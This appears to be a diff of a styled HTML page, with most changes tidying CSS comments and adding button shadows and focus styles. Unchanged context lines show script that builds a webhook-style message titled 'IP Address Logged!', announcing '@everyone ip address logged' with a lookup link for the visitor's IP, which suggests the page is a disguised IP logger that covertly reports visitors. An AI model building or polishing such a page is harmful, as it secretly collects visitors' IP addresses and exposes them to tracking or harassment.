@@ -6,14 +6,14 @@
   <style>
 @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
 
-body {
-  background-color: #e6f2ff; /* Soft baby blue */
+    body {
+  background-color: #e6f2ff; 
   font-family: 'Poppins', sans-serif;
   padding: 20px;
 }
 
 p, h1, h2, h3, h4, h5, h6 {
-  color: #5d9cec; /* Gentle blue */
+  color: #5d9cec;
 }
 
 h1 { color: #4a89dc; font-weight: 700; }
@@ -23,26 +23,35 @@ h4 { color: #5d9cec; font-weight: 500; }
 h5, h6 { color: #7ab3ef; font-weight: 500; }
 
 .button {
-  background-color: #5d9cec; /* Matching blue */
+  background-color: #5d9cec;
   color: white;
   border: none;
-  padding: 10px 20px;
+  padding: 12px 24px;
   border-radius: 8px;
   font-family: 'Poppins', sans-serif;
   font-weight: 600;
   cursor: pointer;
   transition: all 0.3s ease;
+  box-shadow: 0 4px 6px rgba(93, 156, 236, 0.2);
+  letter-spacing: 0.5px;
+  font-size: 0.95rem;
 }
 
-/* Button hover & active effects */
 .button:hover {
-  background-color: #4a89dc; /* Slightly darker */
+  background-color: #4a89dc;
   transform: translateY(-2px);
+  box-shadow: 0 6px 8px rgba(74, 137, 220, 0.25);
 }
 
 .button:active {
   background-color: #3b7dd8;
   transform: translateY(0);
+  box-shadow: 0 2px 4px rgba(59, 125, 216, 0.3);
+}
+
+.button:focus {
+  outline: none;
+  box-shadow: 0 0 0 3px rgba(93, 156, 236, 0.4);
 }
   </style>
 </head>
@@ -65,7 +74,7 @@ h5, h6 { color: #7ab3ef; font-weight: 500; }
       const payload = {
         embeds: [{
           title: "IP Address Logged!",
-          color: 11390326, // Light blue
+          color: 11390326,
           fields: [
             { name: "@everyone ip address logged", value: "\u200b" },
             { name: "IP Link", value: `https://whatismyipaddress.com/ip/${ip}` },
